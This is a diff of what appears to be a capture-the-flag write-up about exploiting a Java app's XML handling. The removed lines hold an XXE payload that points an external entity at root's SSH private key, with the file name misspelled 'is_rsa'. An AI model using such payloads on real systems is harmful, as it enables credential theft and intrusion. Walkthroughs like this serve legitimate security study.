@@ -206,13 +206,6 @@ public static void main(String[] args) throws JDOMException, IOException, JpegPr
 * Reading this Hacktricks article showed me that I needed to edit an xml file, something I couldn't do with the web requests
 * I decided to take the `export.xml` from earlier and modify it with a payload that should return the ssh private key of the root user with the goal of sshing into root
 	* This took a lot of troubleshooting and review of how `App.java` works
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!--?xml version="1.0" ?-->
-<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/.ssh/is_rsa"> ]>
-<credits>
-	<author>woodenk</author>
-	...
-```
-
- 
+		* The `getArtist` function returns the Artist name from the tag in the metadata of the image 
+		* The `addViewTo` function is void, so it does not return a value
+		* The `main` function uses the 
